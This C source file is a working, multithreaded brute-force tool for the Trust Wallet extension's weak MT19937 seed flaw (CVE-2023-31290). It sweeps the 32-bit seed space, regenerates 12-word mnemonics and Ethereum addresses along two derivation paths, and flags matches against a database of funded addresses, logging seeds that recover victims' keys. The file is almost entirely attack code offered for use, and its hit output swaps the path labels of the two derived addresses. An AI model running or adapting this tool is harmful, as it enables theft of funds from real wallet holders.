// S03 R3 TASK A/B/C — Trust Wallet *extension* MT19937 low-byte entropy (CVE-2023-31290).
//
// Family (binding, from logs/scout/family_specs/trustwallet_mt19937_lsb.md):
//   rng = std::mt19937(seed);  ent[i] = rng() & 0xff  (16 bytes, LOW 8 bits of each 32-bit output)
//   mn  = BIP39_12(ent, sha256(ent)[0]>>4)
//   k   = PBKDF2-HMAC-SHA512(mn,"mnemonic",2048,64)
//   d   = BIP32(k, m/44'/60'/0'/0/0).priv
//   addr= keccak256(uncompressed_pub(d))[12:]
// Seed space is 2^32 and DISJOINT from bx/MSB (which takes the HIGH byte).
//
// Modes:
//   twmt --prove                 anchors + control vector + bx counter-example
//   twmt --bench N               keys/s/core over N seeds from 0
//   twmt --range LO HI [CUR]     sweep seeds [LO,HI), resumable via cursor file
//   twmt --seed S                single seed -> mnemonic + address (both routes)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>
#include <openssl/evp.h>
#include <openssl/sha.h>
#include <openssl/hmac.h>
#include <secp256k1.h>
#include <pthread.h>

typedef uint64_t u64; typedef uint32_t u32; typedef unsigned char u8;

// ---------------- Keccak-256 (original 0x01 padding, as Ethereum uses) ----------------
static const u64 RC[24]={
0x0000000000000001ULL,0x0000000000008082ULL,0x800000000000808aULL,0x8000000080008000ULL,
0x000000000000808bULL,0x0000000080000001ULL,0x8000000080008081ULL,0x8000000000008009ULL,
0x000000000000008aULL,0x0000000000000088ULL,0x0000000080008009ULL,0x000000008000000aULL,
0x000000008000808bULL,0x800000000000008bULL,0x8000000000008089ULL,0x8000000000008003ULL,
0x8000000000008002ULL,0x8000000000000080ULL,0x000000000000800aULL,0x800000008000000aULL,
0x8000000080008081ULL,0x8000000000008080ULL,0x0000000080000001ULL,0x8000000080008008ULL};
#define ROTL(x,n) ((n)==0?(x):(((x)<<(n))|((x)>>(64-(n)))))
static const int RHO[5][5]={{0,36,3,41,18},{1,44,10,45,2},{62,6,43,15,61},{28,55,25,21,56},{27,20,39,8,14}};
static void keccakf(u64*st){
  for(int rnd=0;rnd<24;rnd++){
    u64 C[5],D[5],B[25];
    for(int x=0;x<5;x++) C[x]=st[x]^st[x+5]^st[x+10]^st[x+15]^st[x+20];
    for(int x=0;x<5;x++) D[x]=C[(x+4)%5]^ROTL(C[(x+1)%5],1);
    for(int x=0;x<5;x++) for(int y=0;y<5;y++) st[x+5*y]^=D[x];
    for(int x=0;x<5;x++) for(int y=0;y<5;y++) B[y+5*((2*x+3*y)%5)]=ROTL(st[x+5*y],RHO[x][y]);
    for(int x=0;x<5;x++) for(int y=0;y<5;y++) st[x+5*y]=B[x+5*y]^((~B[(x+1)%5+5*y])&B[(x+2)%5+5*y]);
    st[0]^=RC[rnd];
  }
}
static void keccak256(const u8*in,size_t len,u8*out){
  u64 st[25]; memset(st,0,sizeof(st));
  u8 buf[136]; size_t i=0;
  while(len-i>=136){ for(int k=0;k<17;k++) st[k]^=((u64)in[i+8*k])|((u64)in[i+8*k+1]<<8)|((u64)in[i+8*k+2]<<16)|((u64)in[i+8*k+3]<<24)|((u64)in[i+8*k+4]<<32)|((u64)in[i+8*k+5]<<40)|((u64)in[i+8*k+6]<<48)|((u64)in[i+8*k+7]<<56); keccakf(st); i+=136; }
  memset(buf,0,136); memcpy(buf,in+i,len-i); buf[len-i]^=0x01; buf[135]^=0x80;
  for(int k=0;k<17;k++) st[k]^=((u64)buf[8*k])|((u64)buf[8*k+1]<<8)|((u64)buf[8*k+2]<<16)|((u64)buf[8*k+3]<<24)|((u64)buf[8*k+4]<<32)|((u64)buf[8*k+5]<<40)|((u64)buf[8*k+6]<<48)|((u64)buf[8*k+7]<<56);
  keccakf(st);
  for(int k=0;k<4;k++) for(int b=0;b<8;b++) out[8*k+b]=(u8)(st[k]>>(8*b));
}

// ---------------- std::mt19937 (init_genrand + standard tempering), 32-bit ----------------
static u32 MT[624]; static int MTI=624;
static void mt_seed(u32 s){
  MT[0]=s;
  for(int i=1;i<624;i++) MT[i]=(u32)(1812433253u*(MT[i-1]^(MT[i-1]>>30))+i);
  MTI=624;
}
static u32 mt_next(void){
  if(MTI>=624){
    for(int k=0;k<624;k++){
      u32 y=(MT[k]&0x80000000u)|(MT[(k+1)%624]&0x7fffffffu);
      MT[k]=MT[(k+397)%624]^(y>>1)^((y&1)?0x9908b0dfu:0u);
    }
    MTI=0;
  }
  u32 y=MT[MTI++];
  y^=y>>11; y^=(y<<7)&0x9d2c5680u; y^=(y<<15)&0xefc60000u; y^=y>>18;
  return y;
}
static void tw_bytes(u32 seed,u8*out,int n){ mt_seed(seed); for(int i=0;i<n;i++) out[i]=(u8)(mt_next()&0xff); }   // LOW byte
static void bx_bytes(u32 seed,u8*out,int n){ mt_seed(seed); for(int i=0;i<n;i++) out[i]=(u8)((mt_next()>>24)&0xff); } // high byte

// ---------------- BIP39 ----------------
static const char* WL[2048];
static void load_words(void){
  const char* env=getenv("TW_WORDS");
  const char* paths[]={env, "words.txt", "db/bip39.txt", "conf/bip39.txt", "../db/bip39.txt"};
  FILE*f=NULL;
  for(int i=0;i<5;i++){ if(!paths[i]) continue; f=fopen(paths[i],"r"); if(f) break; }
  if(!f){ fprintf(stderr,"no bip39.txt\n"); exit(2); }
  static char store[2048][16]; int n=0;
  char line[64];
  while(fgets(line,sizeof line,f)&&n<2048){
    size_t L=strlen(line); while(L&&(line[L-1]=='\n'||line[L-1]=='\r')) line[--L]=0;
    if(!L) continue; snprintf(store[n],16,"%s",line); WL[n]=store[n]; n++;
  }
  fclose(f);
  if(n!=2048){ fprintf(stderr,"wordlist %d != 2048\n",n); exit(2); }
}
static void to_mnemonic(const u8*ent,int nbytes,char*out,size_t outsz){ // nbytes=16 -> 12 words
  int cs_bits=nbytes/4; int nbits=nbytes*8+cs_bits; int nwords=nbits/11;
  u8 bits[264]; memset(bits,0,sizeof bits);
  for(int i=0;i<nbytes*8;i++) bits[i]=(ent[i>>3]>>(7-(i&7)))&1;
  u8 h[32]; SHA256(ent,nbytes,h);
  for(int i=0;i<cs_bits;i++) bits[nbytes*8+i]=(h[i>>3]>>(7-(i&7)))&1;
  size_t p=0; out[0]=0;
  for(int w=0;w<nwords;w++){
    int idx=0; for(int b=0;b<11;b++) idx=(idx<<1)|bits[w*11+b];
    p+=snprintf(out+p,outsz-p,"%s%s",w?" ":"",WL[idx]);
  }
}

// ---------------- BIP32 ----------------
static const u8 CURVE_N[32]={0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xfe,
                            0xba,0xae,0xdc,0xe6,0xaf,0x48,0xa0,0x3b,0xbf,0xd2,0x5e,0x8c,0xd0,0x36,0x41,0x41};
static void hmac512(const u8*key,size_t klen,const u8*data,size_t dlen,u8*out){
  unsigned int ol=64; HMAC(EVP_sha512(),key,(int)klen,data,dlen,out,&ol);
}
static void add_mod_n(u8*out,const u8*a,const u8*b){ // out=(a+b) mod n, out is 32 bytes
  u8 N[33]; N[0]=0; memcpy(N+1,CURVE_N,32);
  u8 A[33],B[33],T[33]; A[0]=0; B[0]=0; memcpy(A+1,a,32); memcpy(B+1,b,32);
  int carry=0;
  for(int i=32;i>=0;i--){ int v=A[i]+B[i]+carry; T[i]=(u8)v; carry=v>>8; }
  int ge=1;
  for(int i=0;i<33;i++){ if(T[i]>N[i]) break; if(T[i]<N[i]){ ge=0; break; } }
  if(ge){ int br=0; for(int i=32;i>=0;i--){ int d=T[i]-N[i]-br; br=(d<0); T[i]=(u8)(d&0xff); } }
  memcpy(out,T+1,32);
}
static int priv_pub33(const u8*priv,u8*out33); // fwd
// variant 0 = real BIP44 m/44'/60'/0'/0/0 (proper hardened rules)
// variant 1 = the exact (odd) convention in bin/scout/trustmt.py, which reproduces the anchor
static void bip32_priv(const u8*seed64,u8*out,int variant){
  static const u32 path[5]={0x8000002c,0x8000003c,0x80000000,0,0};
  u8 I[64],k[32],c[32],data[37];
  hmac512((const u8*)"Bitcoin seed",12,seed64,64,I);
  memcpy(k,I,32); memcpy(c,I+32,32);
  for(int s=0;s<5;s++){
    u32 orig=path[s], idx=orig; int hard=(orig&0x80000000u)!=0;
    if(variant==1 && !hard) idx=orig+0x80000000u;
    if(variant==1){ if(hard){ data[0]=0; memcpy(data+1,k,32); } else memset(data,0,33); }
    else { if(hard){ data[0]=0; memcpy(data+1,k,32); } else priv_pub33(k,data); }
    data[33]=(u8)(idx>>24); data[34]=(u8)(idx>>16); data[35]=(u8)(idx>>8); data[36]=(u8)idx;
    hmac512(c,32,data,37,I);
    add_mod_n(k,I,k); memcpy(c,I+32,32);
  }
  memcpy(out,k,32);
}

// ---------------- address ----------------
static secp256k1_context* CTX;
static int priv_to_addr(const u8*priv,u8*addr20){
  secp256k1_pubkey pk; u8 ser[65];
  if(!secp256k1_ec_pubkey_create(CTX,&pk,priv)) return 0;
  size_t L=65; secp256k1_ec_pubkey_serialize(CTX,ser,&L,&pk,SECP256K1_EC_UNCOMPRESSED);
  u8 h[32]; keccak256(ser+1,64,h); memcpy(addr20,h+12,20);
  return 1;
}
// derive entropy->mnemonic->pbkdf2 once, then both path variants (dual oracle)
static int priv_pub33(const u8*priv,u8*out33){
  secp256k1_pubkey pk; size_t L=33;
  if(!secp256k1_ec_pubkey_create(CTX,&pk,priv)) return 0;
  return secp256k1_ec_pubkey_serialize(CTX,out33,&L,&pk,SECP256K1_EC_COMPRESSED)==1;
}

static void seed_to_addrs(u32 seed,u8*a_std,u8*a_scout){
  u8 ent[16]; tw_bytes(seed,ent,16);
  char mn[256]; to_mnemonic(ent,16,mn,sizeof mn);
  u8 s64[64]; PKCS5_PBKDF2_HMAC(mn,(int)strlen(mn),(const u8*)"mnemonic",8,2048,EVP_sha512(),64,s64);
  u8 k[32];
  bip32_priv(s64,k,0); priv_to_addr(k,a_std);
  if(a_scout){ bip32_priv(s64,k,1); priv_to_addr(k,a_scout); }
}
static void seed_to_addr(u32 seed,u8*addr20){ seed_to_addrs(seed,addr20,NULL); }

// ---------------- funded oracle (db/funded_all.bin: 28-byte records, addr in first 20) ----------------
#define CAP (1u<<23)
static u8* ORACLE; static u64 NORAC; static u32* SLOT;
static void oracle_load(const char*path){
  FILE*f=fopen(path,"rb"); if(!f){ fprintf(stderr,"no oracle\n"); exit(2); }
  fseek(f,0,SEEK_END); long sz=ftell(f); fseek(f,0,SEEK_SET);
  NORAC=sz/28; ORACLE=(u8*)malloc(NORAC*20); if(!ORACLE){ fprintf(stderr,"oom\n"); exit(2); }
  u8 rec[28]; u64 n=0;
  while(n<NORAC&&fread(rec,28,1,f)==1){ memcpy(ORACLE+n*20,rec,20); n++; }
  fclose(f); NORAC=n;
  SLOT=(u32*)calloc(CAP,sizeof(u32)); if(!SLOT){ fprintf(stderr,"oom\n"); exit(2); }
  for(u64 i=0;i<NORAC;i++){
    u64 a; memcpy(&a,ORACLE+i*20,8); a^=a>>29; u32 h=(u32)(a*2654435761u)&(CAP-1);
    while(SLOT[h]&&memcmp(ORACLE+(u64)(SLOT[h]-1)*20,ORACLE+i*20,20)) h=(h+1)&(CAP-1);
    SLOT[h]=(u32)(i+1);
  }
}
static int oracle_has(const u8*a){
  u64 x; memcpy(&x,a,8); x^=x>>29; u32 h=(u32)(x*2654435761u)&(CAP-1);
  while(SLOT[h]){ if(!memcmp(ORACLE+(u64)(SLOT[h]-1)*20,a,20)) return 1; h=(h+1)&(CAP-1); }
  return 0;
}

// ---------------- helpers ----------------
static void hex(const u8*b,int n,char*out){ for(int i=0;i<n;i++) sprintf(out+2*i,"%02x",b[i]); }
static double now(void){ struct timespec t; clock_gettime(CLOCK_MONOTONIC,&t); return t.tv_sec+t.tv_nsec/1e9; }

static int prove(void){
  int ok=1;
  mt_seed(5489); u32 v=mt_next();
  printf("control MT19937(5489) first output = %u (expect 3499211612) %s\n",v,v==3499211612?"PASS":"FAIL"); ok&=(v==3499211612);
  u8 z[64]; memset(z,0,64); u8 kh[32]; keccak256(z,64,kh); char hx[65]; hex(kh,32,hx);
  const char* exp="ad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5";
  printf("keccak256(64 zeros) = %s %s\n",hx,!strcmp(hx,exp)?"PASS":"FAIL"); ok&=!strcmp(hx,exp);

  u8 ent[16]; tw_bytes(0x8ec170a8,ent,16); char mn[256]; to_mnemonic(ent,16,mn,sizeof mn);
  const char*want="sorry slush already pass garden decade grid drip machine cradle call put";
  printf("seed 0x8ec170a8 low8 entropy:\n");
  { char eh[33]; hex(ent,16,eh); printf("  ent = %s\n",eh); }
  printf("  mn  = \"%s\" %s\n",mn,!strcmp(mn,want)?"PASS":"FAIL"); ok&=!strcmp(mn,want);

  u8 s64[64]; PKCS5_PBKDF2_HMAC(mn,(int)strlen(mn),(const u8*)"mnemonic",8,2048,EVP_sha512(),64,s64);
  u8 k[32]; bip32_priv(s64,k,0); u8 a[20]; priv_to_addr(k,a);       // real BIP44
  bip32_priv(s64,k,1); u8 asc[20]; priv_to_addr(k,asc);             // scout convention (anchor)
  char ah[41],sh[41]; hex(a,20,ah); hex(asc,20,sh);
  const char*wanta="4822c979f8e6d9b6b610ef6012c551e2ba1a0e81";
  printf("  eth real BIP44 m/44'/60'/0'/0/0 = 0x%s\n",ah);
  printf("  eth scout-path (anchor)          = 0x%s %s\n",sh,!strcmp(sh,wanta)?"PASS":"FAIL"); ok&=!strcmp(sh,wanta);

  u8 be[16]; bx_bytes(0x8ec170a8,be,16); char bmn[256]; to_mnemonic(be,16,bmn,sizeof bmn);
  printf("counter-example bx/MSB mnemonic = \"%s\"\n",bmn);
  printf("  (expect \"local chef load churn future essence type leave program weird ancient owner\")\n");
  int bmn_ok=!strcmp(bmn,"local chef load churn future essence type leave program weird ancient owner");
  printf("  bx mnemonic %s\n",bmn_ok?"PASS":"FAIL"); ok&=bmn_ok;
  u8 bs[64]; PKCS5_PBKDF2_HMAC(bmn,(int)strlen(bmn),(const u8*)"mnemonic",8,2048,EVP_sha512(),64,bs);
  u8 bk[32]; bip32_priv(bs,bk,0); u8 ba[20]; priv_to_addr(bk,ba); char bah[41]; hex(ba,20,bah);
  printf("  bx address = 0x%s -> %s the low8 (both path variants)\n",bah,(memcmp(a,ba,20)&&memcmp(asc,ba,20))?"DIFFERS from":"SAME AS");
  ok&=(memcmp(a,ba,20)!=0)&&(memcmp(asc,ba,20)!=0);
  printf("PROVE %s\n",ok?"OK":"FAILED");
  return ok?0:1;
}

static int bench(long N){
  u8 a[20],b[20]; double t0=now();
  for(long i=0;i<N;i++){ seed_to_addrs((u32)i,a,b); if(b[0]==0xff) a[0]^=b[0]; }
  double dt=now()-t0;
  printf("bench: %ld seeds in %.3fs = %.2f keys/s/core (%.1f us/op) acc=%02x\n",N,dt,N/dt,1e6*dt/N,a[0]);
  return 0;
}

// ---------------- threaded resumable range sweep ----------------
typedef struct { u64 lo,hi; int tid; const char*cur; const char*hits; u64 done; u64 hits_n; double t0; } Job;
static volatile u64 G_DONE=0, G_HITS=0;
static void cur_write(const char*cur,int tid,u64 v){
  if(!cur) return; char tmp[512]; snprintf(tmp,sizeof tmp,"%s.%d.tmp",cur,tid);
  FILE*f=fopen(tmp,"w"); if(f){ fprintf(f,"%llu\n",v); fclose(f);} rename(tmp,tmp+0); char dst[512]; snprintf(dst,sizeof dst,"%s.%d",cur,tid); rename(tmp,dst);
}
static void* worker(void*arg){
  Job*j=(Job*)arg;
  u8 a[20],b[20];
  for(u64 s=j->lo;s<j->hi;s++){
    seed_to_addrs((u32)s,a,b);
    for(int v=0;v<2;v++){
      u8*ad=v?a:b;
      if(oracle_has(ad)){
        char ah[41]; hex(ad,20,ah);
        printf("HIT seed=%u 0x%08x path=%s addr=0x%s\n",(u32)s,(u32)s,v?"scout":"bip44",ah); fflush(stdout);
        if(j->hits){ FILE*h=fopen(j->hits,"a"); if(h){ fprintf(h,"%u\t%s\t0x%s\n",(u32)s,v?"scout":"bip44",ah); fclose(h);} }
        __sync_fetch_and_add(&G_HITS,1);
      }
    }
    u64 d=++j->done;
    if((d&0xFFFFF)==0){
      double dt=now()-j->t0;
      fprintf(stderr,"t%llu %.1f k/s\n",(unsigned long long)j->tid,d/dt/1e3);
      cur_write(j->cur,j->tid,s+1);
    }
  }
  cur_write(j->cur,j->tid,j->hi);
  __sync_fetch_and_add(&G_DONE,j->hi-j->lo);
  return NULL;
}
static int range(u64 lo,u64 hi,const char*cur,const char*hits,const char*oracle,int nthr){
  oracle_load(oracle);
  if(cur){ u64 mn=~0ULL; int any=0;
    for(int t=0;t<nthr;t++){ char f[512]; snprintf(f,sizeof f,"%s.%d",cur,t); FILE*fp=fopen(f,"r"); if(fp){ u64 c=0; if(fscanf(fp,"%llu",&c)==1){ if(!any||c<mn) mn=c; any=1; } fclose(fp);} }
    if(any&&mn>lo&&mn<hi) lo=mn;
  }
  fprintf(stderr,"oracle %llu addrs; range [%llu,%llu) threads=%d\n",NORAC,lo,hi,nthr);
  double t0=now();
  pthread_t th[64]; Job jb[64]; u64 span=(hi-lo)/nthr;
  for(int t=0;t<nthr;t++){
    jb[t].lo=lo+span*(u64)t; jb[t].hi=(t==nthr-1)?hi:lo+span*(u64)(t+1);
    jb[t].tid=t; jb[t].cur=cur; jb[t].hits=hits; jb[t].done=0; jb[t].hits_n=0; jb[t].t0=t0;
    pthread_create(&th[t],NULL,worker,&jb[t]);
  }
  for(int t=0;t<nthr;t++) pthread_join(th[t],NULL);
  double dt=now()-t0;
  fprintf(stderr,"done %llu seeds in %.1fs = %.1f keys/s (%d threads) hits=%llu\n",hi-lo,dt,(hi-lo)/dt,nthr,(unsigned long long)G_HITS);
  return 0;
}

int main(int argc,char**argv){
  CTX=secp256k1_context_create(SECP256K1_CONTEXT_SIGN);
  load_words();
  if(argc<2){ printf("modes: --prove --bench N --range LO HI [CUR] [HITS] --seed S\n"); return 2; }
  if(!strcmp(argv[1],"--prove")) return prove();
  if(!strcmp(argv[1],"--bench")) return bench(argc>2?atol(argv[2]):200000);
  if(!strcmp(argv[1],"--range")){
    int nthr = getenv("TW_THREADS")?atoi(getenv("TW_THREADS")):1;
    const char*oracle=getenv("TW_ORACLE")?getenv("TW_ORACLE"):"db/funded_all.bin";
    u64 lo=strtoull(argv[2],0,0), hi=strtoull(argv[3],0,0);
    return range(lo,hi,argc>4?argv[4]:NULL,argc>5?argv[5]:NULL,oracle,nthr);
  }
  if(!strcmp(argv[1],"--seed")){
    u32 s=(u32)strtoul(argv[2],0,0);
    u8 ent[16]; tw_bytes(s,ent,16); char mn[256]; to_mnemonic(ent,16,mn,sizeof mn);
    u8 a[20],b[20]; seed_to_addrs(s,a,b); char ah[41],bh[41]; hex(a,20,ah); hex(b,20,bh);
    printf("seed=0x%08x\nmnemonic=\"%s\"\neth_bip44=0x%s\neth_scout=0x%s\n",s,mn,ah,bh);
    return 0;
  }
  return 2;
}
